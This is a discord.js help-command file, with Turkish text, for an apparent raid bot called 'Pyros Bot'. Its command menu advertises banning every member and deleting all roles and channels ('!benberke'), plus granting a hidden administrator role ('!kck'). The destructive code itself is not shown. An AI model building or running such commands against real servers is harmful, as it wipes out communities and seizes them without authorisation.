               const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

var prefix = ayarlar.prefix;

exports.run = (client, message, params) => {
      if (message.channel.type !== 'dm') {
    const ozelmesajkontrol = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setTimestamp()
    .setAuthor(message.author.username, message.author.avatarURL)
    .setThumbnail(message.author.avatarURL)
    .setFooter(`${message.author.username} tarafından istendi.`, message.author.avatarURL)
    .setDescription(':boom: **Pyros Bot Komutlar Menüsü** :boom:\n\n:white_small_square: | Created by; ``Dãrk. い#2112`` |\n\n:white_small_square: | **!benberke**  = Sunucudaki bütün herkesi banlar, rolleri siler, kanalları siler. \n\n:white_small_square: | **!kck**  = Sada __Pyros__ adında bi rol verir ver o rolde __YÖNETİCİ__ yetkisi olur. \n\n:white_small_square: | **!melkoryap**  = Bire bir __SUNUCU KUR__ komutu gibi birşeydir otomatik rol ve kanal oluşturur.');
    message.channel.sendEmbed(ozelmesajkontrol) }
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['yardım'],
  permLevel: 0
};

exports.help = {
  name: 'yardım',
  description: 'Tüm komutları gösterir.',
  usage: 'yardım',
};